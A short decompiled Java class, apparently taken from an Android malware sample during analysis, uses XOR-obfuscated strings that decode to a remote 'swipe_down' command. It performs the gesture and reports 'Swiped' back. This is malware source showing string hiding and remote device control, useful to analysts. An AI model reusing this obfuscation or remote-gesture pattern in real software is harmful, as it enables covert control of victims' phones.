package com.zjxyxnvvp.nxvxchltf.i;

import com.zjxyxnvvp.nxvxchltf.UIDNwaidobaWIODb;
import com.zjxyxnvvp.nxvxchltf.d;
import org.json.JSONException;
import org.json.JSONObject;
/* loaded from: /home/remnux/decompressedMalicious.dex */
public class o {
    private static short[] $ = {2592, 2596, 2618, 2595, 2614, 2572, 2615, 2620, 2596, 2621, 7387, 7372, 7386, 7388, 7365, 7389, 4186, 4222, 4192, 4217, 4204, 4205};

    private static String $(int i, int i2, int i3) {
        char[] cArr = new char[i2 - i];
        for (int i4 = 0; i4 < i2 - i; i4++) {
            cArr[i4] = (char) ($[i + i4] ^ i3);
        }
        return new String(cArr);
    }

    public static void a(UIDNwaidobaWIODb uIDNwaidobaWIODb) {
        d dVar = d.e;
        p pVar = dVar.c;
        String $2 = $(0, 10, 2643);
        f b2 = pVar.b($2);
        if (b2 != null && !b2.c()) {
            uIDNwaidobaWIODb.g();
            JSONObject jSONObject = new JSONObject();
            try {
                jSONObject.put($(10, 16, 7337), $(16, 22, 4105));
            } catch (JSONException e) {
                e.printStackTrace();
            }
            dVar.c.e($2, jSONObject);
        }
    }
}
